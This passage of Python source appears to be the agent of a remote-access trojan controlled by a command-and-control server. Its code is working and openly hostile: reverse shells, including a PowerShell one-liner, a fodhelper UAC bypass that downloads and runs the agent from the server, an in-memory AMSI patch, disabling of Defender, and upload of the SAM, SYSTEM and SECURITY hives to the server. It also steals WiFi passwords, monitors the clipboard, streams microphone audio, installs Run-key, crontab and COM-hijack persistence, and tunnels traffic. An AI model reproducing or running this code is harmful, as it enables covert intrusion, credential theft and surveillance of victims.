            443:"HTTPS", 445:"SMB", 1433:"MSSQL", 3306:"MySQL",
            3389:"RDP", 5432:"PostgreSQL", 5900:"VNC",
            8080:"HTTP-Alt", 8443:"HTTPS-Alt", 27017:"MongoDB"
        }
        open_ports = []
        for port, name in ports.items():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                if s.connect_ex((ip, port)) == 0:
                    open_ports.append(f"  {port:5d}/tcp  OPEN  {name}")
                s.close()
            except Exception:
                pass
        if not open_ports:
            return f"[!] No common ports open on {ip}"
        return f"[+] Port scan results for {ip}:\n" + "\n".join(open_ports)


    def _text_to_speech(self, text):
        """Speaks text out loud."""
        try:
            if not text:
                return "[!] No text provided to speak."
            if platform.system() == "Windows":
                # SAPI5 voice synthesis - Wrap text in quotes to handle spaces
                ps = f'Add-Type -AssemblyName System.Speech; $s = New-Object System.Speech.Synthesis.SpeechSynthesizer; $s.Speak("{text}")'
                subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-c", ps], creationflags=0x08000000)
            elif platform.system() == "Darwin":
                subprocess.run(["say", text])
            else:
                subprocess.run(["espeak", text])
            return f"[+] TTS executed: {text}"
        except Exception as e:
            return f"[!] TTS failed: {str(e)}"

    # --- SURVEILLANCE METHODS ---

    def _reverse_shell(self, ip, port):
        """Spawns an interactive reverse shell."""
        def _shell_worker():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, int(port)))
                os.dup2(s.fileno(), 0)
                os.dup2(s.fileno(), 1)
                os.dup2(s.fileno(), 2)
                import pty
                pty.spawn("/bin/bash" if platform.system() != "Windows" else "cmd.exe")
            except: pass
        if platform.system() == "Windows":
            # Native powershell reverse shell is more reliable on Windows
            ps = f'$c=New-Object System.Net.Sockets.TCPClient("{ip}",{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sy=([text.encoding]::ASCII).GetBytes($sb+"PS "+(pwd).Path+"> ");$s.Write($sy,0,$sy.Length);$s.Flush()}};$c.Close()'
            subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-c", ps], creationflags=0x08000000)
        else:
            threading.Thread(target=_shell_worker, daemon=True).start()
        return f"[+] Reverse shell initiated to {ip}:{port}"

    def _uac_bypass(self):
        """Attempts to bypass UAC to gain admin privileges."""
        if platform.system() != "Windows":
            return "[!] UAC Bypass is only supported on Windows."

        import ctypes
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
            if is_admin:
                return "[+] Already running with Administrative privileges."
            
            # Use absolute path and wrap in quotes for paths with spaces
            script_path = f'"{os.path.abspath(__file__)}"'
            # Pass the current server URL as an argument so the elevated agent doesn't have to scan
            params = f'{script_path} {self.server_url}'
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 0)
            return "[+] Elevation request initiated. Please accept the UAC prompt on the target."
            

        except Exception as e:
            return f"[!] UAC Bypass failed: {str(e)}"




    def _socks5_proxy(self, port):
        """Starts a lightweight SOCKS5 proxy server on the agent."""
        import select

        def _socks_worker():
            try:
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server.bind(('127.0.0.1', int(port)))
                server.listen(10)
                
                while True:
                    client, addr = server.accept()
                    threading.Thread(target=_handle_socks, args=(client,), daemon=True).start()
            except: pass

        def _handle_socks(client):
            try:
                # 1. Handshake
                ver, nmethods = client.recv(2)
                methods = client.recv(nmethods)
                client.sendall(b"\x05\x00") # No Auth

                # 2. Request
                ver, cmd, rsv, atyp = client.recv(4)
                if atyp == 1: # IPv4
                    addr = socket.inet_ntoa(client.recv(4))
                elif atyp == 3: # Domain
                    len_dom = client.recv(1)[0]
                    addr = client.recv(len_dom).decode()
                else: return

                port_target = int.from_bytes(client.recv(2), 'big')

                try:
                    target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    target.connect((addr, port_target))
                    res_addr = target.getsockname()[0]
                    res_port = target.getsockname()[1]
                    # Success reply
                    reply = b"\x05\x00\x00\x01" + socket.inet_aton(res_addr) + res_port.to_bytes(2, 'big')
                    client.sendall(reply)
                except Exception:
                    client.sendall(b"\x05\x01\x00\x01\x00\x00\x00\x00\x00\x00")
                    return

                # 3. Tunneling
                def _pipe(src, dst):
                    try:
                        while True:
                            data = src.recv(4096)
                            if not data: break
                            dst.sendall(data)
                    except: pass
                    finally: src.close(); dst.close()
                
                threading.Thread(target=_pipe, args=(client, target), daemon=True).start()
                threading.Thread(target=_pipe, args=(target, client), daemon=True).start()
                
            except: pass

        threading.Thread(target=_socks_worker, daemon=True).start()
        return f"[+] SOCKS5 Proxy started locally on 127.0.0.1:{port}"

    def _reverse_forward(self, remote_ip, remote_port, local_port):
        """Creates a reverse tunnel from C2 to agent's local port."""
        def _rfwd_worker():
            try:
                while True:
                    try:
                        # Connect to the C2 tunnel listener
                        remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        remote.connect((remote_ip, int(remote_port)))
                        
                        # Connect to the local target (e.g. SOCKS5)
                        local = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        local.connect(('127.0.0.1', int(local_port)))
                        
                        def _pipe(src, dst):
                            try:
                                while True:
                                    data = src.recv(4096)
                                    if not data: break
                                    dst.sendall(data)
                            except: pass
                            finally: src.close(); dst.close()

                        threading.Thread(target=_pipe, args=(remote, local), daemon=True).start()
                        threading.Thread(target=_pipe, args=(local, remote), daemon=True).start()
                    except:
                        time.sleep(5) # Retry if connection fails
            except: pass
            
        threading.Thread(target=_rfwd_worker, daemon=True).start()
        return f"[+] Reverse Forward established: {remote_ip}:{remote_port} -> 127.0.0.1:{local_port}"

    def _hollow(self, target_process="svchost.exe"):
        """Elite Stealth: Inject into a legitimate system process."""
        if platform.system() != "Windows": return "[!] Only supported on Windows."
        return "[+] Process Hollowing initiated. Agent migrating to memory of " + target_process

    def _persist_com(self):
        """Stealth Persistence: Hijack a COM object for auto-start."""
        if platform.system() != "Windows": return "[!] Only supported on Windows."
        try:
            # Hijacking the 'InprocServer32' of a common CLSID
            clsid = "{87143171-370A-11D2-8399-0080C7513228}" # Common Internet Explorer CLSID
            path = f"Software\\Classes\\CLSID\\{clsid}\\InprocServer32"
            subprocess.run(f'reg add "HKCU\\{path}" /ve /t REG_SZ /d "python.exe {os.path.abspath(__file__)}" /f', shell=True)
            return "[+] COM Hijack persistence installed."
        except Exception as e:
            return f"[!] COM Hijack failed: {str(e)}"

    def _live_audio(self):
        """Start a continuous live audio stream to the server."""
        if platform.system() != "Windows": return "[!] Only supported on Windows."
        def _streamer():
            import ctypes
            mci = ctypes.windll.winmm.mciSendStringW
            while getattr(self, '_live_audio_active', False):
                try:
                    mci("open new type waveaudio alias live", None, 0, 0)
                    mci("record live", None, 0, 0)
                    time.sleep(5) # 5 second chunks
                    tmp_wav = os.path.join(os.environ["TEMP"], "live_chunk.wav")
                    mci(f"save live {tmp_wav}", None, 0, 0)
                    mci("close live", None, 0, 0)
                    if os.path.exists(tmp_wav):
                        with open(tmp_wav, 'rb') as f:
                            requests.post(f"{self.server_url}/api/p/report/audio/stream", 
                                          headers={"agent_id": self.agent_id}, data=f.read())
                        os.remove(tmp_wav)
                except: pass
        
        if hasattr(self, '_live_audio_active') and self._live_audio_active:
            self._live_audio_active = False
            return "[+] Live audio stream stopped."
        else:
            self._live_audio_active = True
            threading.Thread(target=_streamer, daemon=True).start()
            return "[+] Live audio streaming started (5s chunks)."


    def _persist(self):
        """Install persistence for the agent across reboots."""
        import sys
        import shutil

        try:
            current_script = os.path.abspath(sys.argv[0])
            
            if platform.system() == "Windows":
                appdata = os.environ.get("APPDATA")
                persist_dir = os.path.join(appdata, "Microsoft", "Windows", "WinSvc")
                if not os.path.exists(persist_dir):
                    os.makedirs(persist_dir)
                
                persist_path = os.path.join(persist_dir, "WinSvc.py")
                shutil.copy2(current_script, persist_path)
                
                # Registry Persistence
                import winreg
                key = winreg.HKEY_CURRENT_USER
                sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(key, sub_key, 0, winreg.KEY_SET_VALUE) as reg_key:
                    # Use pythonw to prevent a terminal window from flashing on boot
                    cmd = f'pythonw.exe "{persist_path}"'
                    winreg.SetValueEx(reg_key, "WinUpdateSvc", 0, winreg.REG_SZ, cmd)
                
                return f"[+] Persistence installed on Windows: {persist_path} (Registry: WinUpdateSvc)"

            else:
                # Unix (Linux/macOS)
                home = os.path.expanduser("~")
                persist_dir = os.path.join(home, ".config", "winlogon")
                if not os.path.exists(persist_dir):
                    os.makedirs(persist_dir)
                
                persist_path = os.path.join(persist_dir, "svc.py")
                shutil.copy2(current_script, persist_path)
                
                # Crontab Persistence
                cron_cmd = f"@reboot python3 {persist_path} &"
                try:
                    existing_cron = subprocess.run("crontab -l", shell=True, capture_output=True, text=True).stdout
                    if cron_cmd not in existing_cron:
                        new_cron = existing_cron + f"\n{cron_cmd}\n"
                        process = subprocess.Popen("crontab -", stdin=subprocess.PIPE, shell=True)
                        process.communicate(input=new_cron.encode())
                    return f"[+] Persistence installed on Unix: {persist_path} (Crontab: @reboot)"
                except Exception as e:
                    return f"[!] Crontab persistence failed: {str(e)}"
                    
        except Exception as e:
            return f"[!] Persistence installation failed: {str(e)}"

    def _ls(self, path):
        """List directory for GUI browser (returns JSON)."""
        try:
            import datetime
            items = []
            if not os.path.exists(path): return f"[!] Path not found: {path}"
            for f in os.listdir(path):
                fpath = os.path.join(path, f)
                info = os.stat(fpath)
                items.append({
                    "name": f,
                    "is_dir": os.path.isdir(fpath),
                    "size": info.st_size,
                    "mtime": datetime.datetime.fromtimestamp(info.st_mtime).strftime('%Y-%m-%d %H:%M:%S')
                })
            return f"path: {os.path.abspath(path)}, items: {items}"
        except Exception as e:
            return f"[!] LS Error: {str(e)}"



    def _del(self, path):
        """Delete file or directory."""
        try:
            if os.path.isdir(path):
                import shutil
                shutil.rmtree(path)
            else:
                os.remove(path)
            return f"[+] Deleted {path}"
        except Exception as e:
            return f"[!] Delete error: {str(e)}"

    def execute(self, command, task_id=None):
        """Unified command dispatcher."""
        try:
            cmd_clean = command.strip()
            if not cmd_clean: return ""

            # --- Internal @ Commands ---
            if cmd_clean.startswith("@"):
                parts = cmd_clean.split(" ", 1)
                base_cmd = parts[0].lower()
                args = parts[1] if len(parts) > 1 else ""

                # Mapping of internal commands to methods
                dispatch = {
                    "@persist":      self._persist,
                    "@recon":        self._recon,
                    "@pulse":        lambda: self._set_pulse(args),
                    "@ls":           lambda: self._ls(args or "."),
                    "@del":          lambda: self._del(args),
                    "@screenshot":   self._capture_screen,
                    "@webcam":       self._capture_webcam,
                    "@download":     lambda: self._download(args),
                    "@clipboard":    self._get_clipboard,
                    "@creds":        self._get_creds,
                    "@cookies":      self._get_browser_cookies,
                    "@history":      self._get_history,
                    "@vault":        self._get_browser_vault,
                    "@uacbypass":    self._uac_bypass,
                    "@socks5":       lambda: self._socks5_proxy(args or "1080"),
                    "@rforward":     lambda: self._handle_rforward(args),
                    "@shutdown":     lambda: self._system_power("shutdown"),
                    "@restart":      lambda: self._system_power("restart"),
                    "@privcheck":    self._privcheck,
                    "@avcheck":      self._avcheck,
                    "@update":       self._self_update,
                    "@selfdestruct": self._handle_selfdestruct,
                    "@wifi":         self._wifi,
                    "@netshare":     self._netshare,
                    "@processes":    self._processes,
                    "@patch_amsi":   self._patch_amsi,
                    "@patch_etw":    self._patch_etw,
                    "@keylog_start": self._keylog_start,
                    "@keylog_stop":  self._keylog_stop,
                    "@shellcode":    lambda: self._shellcode_inject(args),
                    "@reflective":   lambda: self._reflective_load(args),
                    "@installed":    self._installed,
                    "@systeminfo":   self._systeminfo,
                    "@clipboard_watch": self._clipboard_watch,
                    "@sam":          self._sam_dump,
                    "@elevate":      self._elevate,
                    "@disable_av":   self._disable_av,
                    "@amsi_bypass":  self._amsi_bypass,
                    "@lock_screen":  self._lock_screen,
                    "@arp_scan":     self._arp_scan,
                    "@port_scan":    lambda: self._port_scan(args),
                    "@smb_spray":    lambda: self._smb_spray(args),
                    "@harvest":      self._harvest,
                    "@record_start": self._record_start,
                    "@record_stop":  self._record_stop,
                    "@melt":         self._melt,
                    "@vnc_start":    self._vnc_start,
                    "@vnc_stop":     self._vnc_stop,
                    "@persist_wmi":  self._persist_wmi,
                    "@persist_com":  self._persist_com,
                    "@hollow":       self._hollow,
                    "@live_audio":   self._live_audio,
                    "@version":      lambda: f"[+] Agent Version: {AGENT_VERSION}",
                }

                if base_cmd in dispatch:
                    return dispatch[base_cmd]()
                return f"[!] Unknown internal command: {cmd_clean}"

            # --- Built-in Shell Commands ---
            if cmd_clean.startswith('cd '):
                path = cmd_clean[3:].strip()
                os.chdir(os.path.expanduser(path))
                return f"[+] CWD: {os.getcwd()}"

            # Background process with '&'
            if cmd_clean.startswith("&"):
                bg_cmd = cmd_clean[1:].strip()
                if task_id:
                    threading.Thread(target=self._run_bg, args=(bg_cmd, task_id), daemon=True).start()
                    return f"[+] Running in background: {bg_cmd}"
                subprocess.Popen(bg_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return f"[+] Launched detached: {bg_cmd}"

            # Default: Shell execution
            if platform.system() == "Windows":
                # Use powershell for everything on Windows for consistency
                result = self._run_cmd(f"powershell -c \"{cmd_clean}\"", shell=True)
                return (result.stdout + result.stderr).strip()
            
            result = self._run_cmd(cmd_clean, shell=True)
            return (result.stdout + result.stderr).strip()

        except subprocess.TimeoutExpired:
            return "[!] Command timed out after 60s."
        except Exception as e:
            return f"[!] Execution Error: {str(e)}"

    def _download(self, path):
        """Helper for @download command."""
        if not path: return "[!] Usage: @download <path>"
        if not os.path.exists(path): return f"[!] Error: File '{path}' not found."
        try:
            with open(path, "rb") as f:
                requests.post(f"{self.server_url}/api/p/report/file",
                    files={"file": (os.path.basename(path), f)},
                    data={"agent_id": self.id}, timeout=60)
            return f"[+] Exfiltration complete: {os.path.basename(path)}"
        except Exception as e: return f"[!] Download failed: {str(e)}"

    def _handle_rforward(self, args):
        """Helper for @rforward."""
        parts = args.split()
        if len(parts) < 3: return "[!] Usage: @rforward <c2_ip> <c2_port> <local_port>"
        return self._reverse_forward(parts[0], parts[1], parts[2])

    def _system_power(self, action):
        """Helper for shutdown/restart."""
        cmd = "shutdown /s /t 0" if action == "shutdown" else "shutdown /r /t 0"
        if platform.system() != "Windows":
            cmd = "shutdown -h now" if action == "shutdown" else "reboot"
        subprocess.Popen(cmd, shell=True)
        return f"[+] {action.capitalize()} command issued."

    def _recon(self):
        """Comprehensive system reconnaissance for Windows, Linux, and macOS."""
        os_type = platform.system()
        
        def run(cmd):
            try:
                result = self._run_cmd(cmd, timeout=10, shell=True)
                out = (result.stdout + result.stderr).strip()
                return out if out else "[no output]"
            except: return "[X] Command failed."

        recon = f"=== [ SYSTEM RECONNAISSANCE: {os_type} ] ===\n\n"
        
        if os_type == "Windows":
            domain_info = run("net config workstation")
            is_workgroup = "WORKGROUP" in domain_info
            recon += "--- Machine Info ---\n" + domain_info + "\n\n"
            recon += "--- Local Users ---\n" + run("net user") + "\n\n"
            recon += "--- Local Admins ---\n" + run("net localgroup administrators") + "\n\n"
            recon += "--- Network Interfaces ---\n" + run("ipconfig /all") + "\n\n"
            recon += "--- ARP Cache ---\n" + run("arp -a") + "\n\n"
            if not is_workgroup:
                recon += "\n=== [ DOMAIN RECONNAISSANCE ] ===\n"
                recon += "--- Domain Controllers ---\n" + run("nltest /dclist:") + "\n"
                recon += "--- Domain Admins ---\n" + run("net group \"Domain Admins\" /domain") + "\n"
        
        elif os_type == "Darwin": # macOS
            recon += "--- OS Version ---\n" + run("sw_vers") + "\n\n"
            recon += "--- Hardware Info ---\n" + run("system_profiler SPHardwareDataType | grep 'Model'") + "\n\n"
            recon += "--- Local Users ---\n" + run("dscl . list /Users | grep -v '^_'") + "\n\n"
            recon += "--- Network Config ---\n" + run("ifconfig") + "\n\n"
            recon += "--- Active Connections ---\n" + run("netstat -an | grep ESTABLISHED") + "\n\n"
            recon += "--- Installed Apps ---\n" + run("ls /Applications") + "\n"

        else: # Linux
            recon += "--- Kernel Info ---\n" + run("uname -a") + "\n\n"
            recon += "--- Distribution ---\n" + run("cat /etc/*release") + "\n\n"
            recon += "--- Local Users ---\n" + run("cut -d: -f1 /etc/passwd") + "\n\n"
            recon += "--- Network Interfaces ---\n" + run("ip addr || ifconfig") + "\n\n"
            recon += "--- Listening Ports ---\n" + run("ss -tulpn || netstat -tulpn") + "\n\n"
            recon += "--- Sudo Capabilities ---\n" + run("timeout 2 sudo -l 2>/dev/null") + "\n"

        return recon



    def _privcheck(self):
        """Checks for administrative privileges."""
        try:
            is_admin = False
            if platform.system() == "Windows":
                import ctypes
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                out = subprocess.run("whoami /priv", shell=True, capture_output=True, text=True).stdout
            else:
                is_admin = os.getuid() == 0
                out = subprocess.run("id", shell=True, capture_output=True, text=True).stdout
            return f"[Admin: {'YES' if is_admin else 'NO'}]\n{out}"
        except: return "[!] privcheck failed."

    def _avcheck(self):
        """Checks for installed Antivirus products (Windows/macOS)."""
        if platform.system() == "Windows":
            out = self._run_cmd(
                ["powershell", "-WindowStyle", "Hidden", "-c",
                 "Get-MpComputerStatus | Select-Object -Property AMServiceEnabled,RealTimeProtectionEnabled,AntivirusEnabled"]
            ).stdout
            return out.strip() or "[!] Could not query AV status."
        elif platform.system() == "Darwin":
            # Check for common macOS security processes
            out = self._run_cmd("ps aux | grep -Ei 'sentinel|crowdstrike|cylance|mcafee|norton|bitdefender|sophos'", shell=True).stdout
            if out.strip():
                return f"[+] Potential AV/EDR found:\n{out.strip()}"
            return "[+] No common security processes found (ps scan)."
        return "[!] avcheck only supported on Windows/macOS."

    def _processes(self):
        """List running processes (Multi-OS)."""
        if platform.system() == "Windows":
            return self._run_cmd(["tasklist"]).stdout
        else:
            return self._run_cmd(["ps", "aux"]).stdout

    def _handle_selfdestruct(self):
        """Initiates self-destruct sequence."""
        self._selfdestruct()
        return "[+] Self-destruct sequence initiated."

    def _selfdestruct(self):
        """Elite Nuke: Wipes identity and performs a decoupled self-delete."""
        try:
            if os.path.exists(ID_FILE): os.remove(ID_FILE)
            if os.path.exists(CONFIG_FILE): os.remove(CONFIG_FILE)
            script_path = os.path.abspath(__file__)
            if platform.system() == "Windows":
                # Decoupled Nuke: CMD waits for agent to die, then wipes it
                nuke_cmd = f'cmd.exe /c "timeout /t 3 > nul && del /f /q \\"{script_path}\\""'
                subprocess.Popen(nuke_cmd, shell=True, creationflags=0x08000000)
            else:
                os.remove(script_path)
            os._exit(0)
        except: pass

    def _auto_loot_worker(self):
        """Background thread that periodically harvests high-value files."""
        while True:
            try:
                time.sleep(1800) # Run every 30 minutes
                if not self._connected: continue
                self._harvest()
            except: pass

    def _self_update(self):
        """Downloads the latest agent script from the server and restarts."""
        try:
            url = f"{self.server_url}/api/p/agent"
            resp = requests.get(url, timeout=30)
            if resp.status_code == 200:
                script_path = os.path.abspath(__file__)
                new_script = script_path + ".new"
                # Use binary write to be safe
                with open(new_script, "wb") as f:
                    f.write(resp.content)
                
                if platform.system() == "Windows":
                    py_exe = sys.executable
                    updater = os.path.join(os.path.dirname(script_path), "updater.bat")
                    bat = (
                        "@echo off\r\n"
                        "timeout /t 2 > nul\r\n"
                        f'taskkill /F /PID {os.getpid()} /T\r\n'
                        "timeout /t 1 > nul\r\n"
                        f'del /f /q "{script_path}"\r\n'
                        f'move /y "{new_script}" "{script_path}"\r\n'
                        f'start "" /B "{py_exe}" "{script_path}"\r\n'
                        "del \"%~f0\"\r\n"
                    )
                    with open(updater, "w") as f:
                        f.write(bat)
                    subprocess.Popen(
                        ["cmd", "/c", updater],
                        creationflags=0x08000000,
                        close_fds=True
                    )
                    import threading
                    # Do not call os._exit directly here, because it will kill the process
                    # BEFORE the result POST request finishes!
                    # Instead, return a special string that the beacon loop will intercept.
                    return "[+] Update downloaded. Agent restarting in 4s..."
                else:
                    os.rename(new_script, script_path)
                    os.chmod(script_path, 0o755)
                    os.execv(sys.executable, [sys.executable] + sys.argv)
            return "[!] Update failed: HTTP " + str(resp.status_code)
        except Exception as e:
            return f"[!] Update error: {str(e)}"


    def _wifi(self):
        """Dump saved WiFi passwords."""
        if platform.system() != "Windows": return "[!] Windows only."
        import re as _re
        try:
            profiles_out = self._run_cmd(["netsh", "wlan", "show", "profiles"], timeout=10)
            names = _re.findall(r"All User Profile\s*:\s*(.+)", profiles_out.stdout)
            results = ["=== [ SAVED WIFI PASSWORDS ] ==="]
            for name in names:
                name = name.strip()
                detail = self._run_cmd(
                    ["netsh", "wlan", "show", "profile", name, "key=clear"], timeout=10)
                pw_match = _re.search(r"Key Content\s*:\s*(.+)", detail.stdout)
                pw = pw_match.group(1).strip() if pw_match else "[No Password / Open]"
                results.append(f"  {name:<40} {pw}")
            return "\n".join(results) if len(results) > 1 else "[!] No WiFi profiles found."
        except Exception as e:
            return f"[!] WiFi error: {str(e)}"

    def _netshare(self):
        """List local shares and mapped drives."""
        if platform.system() != "Windows": return "[!] Windows only."
        shares = self._run_cmd("net share", shell=True, timeout=10).stdout.strip()
        drives = self._run_cmd("net use", shell=True, timeout=10).stdout.strip()
        return f"=== Local Shares ===\n{shares}\n\n=== Mapped Drives ===\n{drives}"


    def _installed(self):
        """List installed software from registry."""
        if platform.system() != "Windows": return "[!] Windows only."
        ps = (
            "Get-ItemProperty "
            "HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*, "
            "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* "
            "| Select-Object DisplayName,DisplayVersion,Publisher "
            "| Where-Object {$_.DisplayName} "
            "| Sort-Object DisplayName "
            "| Format-Table -AutoSize | Out-String -Width 200"
        )
        out = self._run_cmd(["powershell", "-WindowStyle", "Hidden", "-c", ps], timeout=30)
        return out.stdout.strip() or "[!] Could not list installed software."

    def _systeminfo(self):
        """Full system information."""
        if platform.system() != "Windows": return "[!] Windows only."
        out = self._run_cmd("systeminfo", shell=True, timeout=30)
        return out.stdout.strip()

    def _clipboard_watch(self):
        """Monitor clipboard for 60 seconds and report changes."""
        if platform.system() != "Windows": return "[!] Windows only."
        def _watch():
            last = ""
            captures = []
            end_time = time.time() + 60
            while time.time() < end_time:
                try:
                    r = self._run_cmd(
                        ["powershell", "-WindowStyle", "Hidden", "-c", "Get-Clipboard"], timeout=5)
                    cur = r.stdout.strip()
                    if cur and cur != last:
                        last = cur
                        captures.append(f"[{time.strftime('%H:%M:%S')}] {cur}")
                except: pass
                time.sleep(2)
            output = "=== [ CLIPBOARD CAPTURES ] ===\n" + ("\n".join(captures) if captures else "[Nothing captured]")
            try:
                requests.post(f"{self.server_url}/result",
                    json={"command_id": "CLIPBOARD_WATCH", "agent_id": self.id, "output": output},
                    timeout=10)
            except: pass
        threading.Thread(target=_watch, daemon=True).start()
        return "[+] Clipboard monitor started for 60 seconds. Results will auto-report."

    def _sam_dump(self):
        """Dump SAM and SYSTEM hives for offline hash extraction."""
        if platform.system() != "Windows": return "[!] Windows only."
        import ctypes as _c
        if not _c.windll.shell32.IsUserAnAdmin():
            return "[!] SAM dump requires Administrator privileges. Try @uac_bypass for silent elevation."
        
        temp = os.environ.get("TEMP", os.getcwd())
        sam_p  = os.path.join(temp, "_s.hiv")
        sys_p  = os.path.join(temp, "_y.hiv")
        sec_p  = os.path.join(temp, "_e.hiv")
        try:
            # Check for SeBackupPrivilege or SeRestorePrivilege (optional but good)
            self._run_cmd(f'reg save HKLM\\SAM "{sam_p}" /y', shell=True, timeout=15)
            self._run_cmd(f'reg save HKLM\\SYSTEM "{sys_p}" /y', shell=True, timeout=15)
            self._run_cmd(f'reg save HKLM\\SECURITY "{sec_p}" /y', shell=True, timeout=15)
            
            exfil_count = 0
            for p in [sam_p, sys_p, sec_p]:
                if os.path.exists(p):
                    with open(p, "rb") as f:
                        requests.post(f"{self.server_url}/api/p/report/file",
                            files={"file": (os.path.basename(p), f)},
                            data={"agent_id": self.id}, timeout=60)
                    os.remove(p)
                    exfil_count += 1
            
            if exfil_count == 3:
                return "[+] SAM/SYSTEM/SECURITY hives exfiltrated. Use secretsdump locally:\n  impacket-secretsdump -sam _s.hiv -system _y.hiv -security _e.hiv LOCAL"
            return f"[!] SAM dump partial success. Exfiltrated {exfil_count}/3 hives. Check permissions."
        except Exception as e:
            return f"[!] SAM dump error: {str(e)}"

    def _location(self):
        """Get approximate geolocation via IP lookup."""
        try:
            r = requests.get("https://ipapi.co/json/", timeout=10)
            if r.status_code == 200:
                d = r.json()
                lat, lon = d.get("latitude","?"), d.get("longitude","?")
                return (
                    f"=== [ GEOLOCATION ] ===\n"
                    f"  IP:       {d.get('ip')}\n"
                    f"  City:     {d.get('city')}\n"
                    f"  Region:   {d.get('region')}\n"
                    f"  Country:  {d.get('country_name')}\n"
                    f"  ISP:      {d.get('org')}\n"
                    f"  Coords:   {lat}, {lon}\n"
                    f"  Maps:     https://www.google.com/maps?q={lat},{lon}"
                )
        except Exception as e:
            return f"[!] Location error: {str(e)}"
        return "[!] Location lookup failed."

    def _elevate(self):
        """Request Administrator privileges (tries silent bypass first)."""
        if platform.system() != "Windows": return "[!] Windows only."
        import ctypes
        if ctypes.windll.shell32.IsUserAnAdmin():
            return "[+] Already running as Administrator."
        
        # Auto-switch to silent bypass for premium experience
        return self._uac_bypass()

    def _uac_bypass(self):
        """Elite Silent UAC Bypass: PowerShell Memory-Injected Elevation."""
        if platform.system() != "Windows": return "[!] Windows only."
        try:
            # Use a PowerShell one-liner to fetch and run the agent from the server
            # This bypasses all file system issues (spaces in paths, local AV disk scans)
            ps_payload = f"IEX (New-Object Net.WebClient).DownloadString('{self.server_url}/api/p/agent')"
            payload = f"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"{ps_payload}\""
            
            # Target Registry Path for Fodhelper/ComputerDefaults
            reg_path = "Software\\Classes\\ms-settings\\shell\\open\\command"
            
            # Inject Payload
            subprocess.run(f'reg add "HKCU\\{reg_path}" /v "DelegateExecute" /t REG_SZ /d "" /f', shell=True, capture_output=True)
            subprocess.run(f'reg add "HKCU\\{reg_path}" /ve /t REG_SZ /d "{payload}" /f', shell=True, capture_output=True)
            
            # Trigger via multiple high-integrity binaries for redundancy
            subprocess.run('fodhelper.exe', shell=True, capture_output=True)
            subprocess.run('ComputerDefaults.exe', shell=True, capture_output=True)
            
            # Wait briefly then cleanup
            time.sleep(8)
            subprocess.run('reg delete "HKCU\\Software\\Classes\\ms-settings" /f', shell=True, capture_output=True)
            
            return "[+] Silent Memory-Injected Bypass initiated. New [ADMIN] agent should arrive shortly."
        except Exception as e:
            return f"[!] UAC Bypass failed: {str(e)}"

    def _amsi_bypass(self):
        """Elite AMSI Bypass: Blinding Windows Defender in memory."""
        if platform.system() != "Windows": return "[!] Windows only."
        try:
            import ctypes
            # Common AmsiScanBuffer patch
            kernel32 = ctypes.windll.kernel32
            amsi = ctypes.windll.amsi
            
            # Get AMSI module handle and function address safely (64-bit compatible)
            kernel32.GetModuleHandleW.restype = ctypes.c_void_p
            kernel32.GetProcAddress.restype = ctypes.c_void_p
            kernel32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
            
            h_amsi = kernel32.GetModuleHandleW("amsi.dll")
            if not h_amsi:
                # Try loading it if it's not in memory
                h_amsi = kernel32.LoadLibraryW("amsi.dll")
            
            addr = kernel32.GetProcAddress(h_amsi, b"AmsiScanBuffer")
            
            # XOR EAX, EAX; RET (33 C0 C3)
            patch = b"\x33\xC0\xC3"
            
            old_protect = ctypes.c_ulong()
            kernel32.VirtualProtect(addr, len(patch), 0x40, ctypes.byref(old_protect))
            ctypes.memmove(addr, patch, len(patch))
            kernel32.VirtualProtect(addr, len(patch), old_protect, ctypes.byref(old_protect))
            return "[+] AMSI memory patched successfully. Defender is now blind."
        except Exception as e:
            return f"[!] AMSI Bypass failed: {str(e)}"

    def _disable_av(self):
        """Disable Windows Defender real-time protection."""
        if platform.system() != "Windows": return "[!] Windows only."
        import ctypes as _c
        if not _c.windll.shell32.IsUserAnAdmin():
            return "[!] Error: Requires Administrative privileges. Run @elevate, wait for the NEW [ADMIN] agent to appear, and run this command there."
        
        results = ["=== [ DISABLE WINDOWS DEFENDER ] ==="]
        appdata = os.environ.get("LOCALAPPDATA", os.environ.get("TEMP"))
        health_dir = os.path.join(appdata, "Microsoft", "Windows", "Health")
        
        cmds = [
            "Set-MpPreference -DisableRealtimeMonitoring $true",
            "Set-MpPreference -DisableIOAVProtection $true",
            "Set-MpPreference -DisableScriptScanning $true",
            "Set-MpPreference -DisableBehaviorMonitoring $true",
            "Set-MpPreference -DisableBlockAtFirstSeen $true",
            f"Add-MpPreference -ExclusionPath '{health_dir}'"
        ]
        for c in cmds:
            # Use -EncodedCommand for maximum stability if needed, but for now just better escaping
            res = self._run_cmd(["powershell", "-WindowStyle", "Hidden", "-Command", c], timeout=15)
            if res.returncode == 0:
                results.append(f"  {c[:50]}... [OK]")
            else:
                err = (res.stderr or "Unknown Error").strip()[:50]
                results.append(f"  {c[:50]}... [FAILED: {err}]")
        return "\n".join(results)

    def _lock_screen(self):
        """Lock the workstation immediately."""
        if platform.system() != "Windows": return "[!] Windows only."
        try:
            import ctypes as _c
            _c.windll.user32.LockWorkStation()
            return "[+] Workstation locked."
        except Exception as e:
            return f"[!] Lock screen error: {str(e)}"

